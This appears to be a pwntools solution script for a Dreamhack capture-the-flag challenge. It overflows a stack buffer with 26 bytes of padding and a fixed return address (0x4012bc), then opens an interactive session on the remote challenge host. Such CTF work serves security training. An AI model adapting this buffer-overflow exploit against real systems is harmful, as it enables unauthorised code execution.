#!/usr/bin/python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b *main+185
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 24431)
else:
    p = process([exe.path])
GDB()
sa(b'Menu: ', b'cherry'.ljust(13, b'9'))
payload = b'A'*26 
payload += p64(0x4012bc)
sa(b'Is it cherry?: ', payload)




p.interactive()

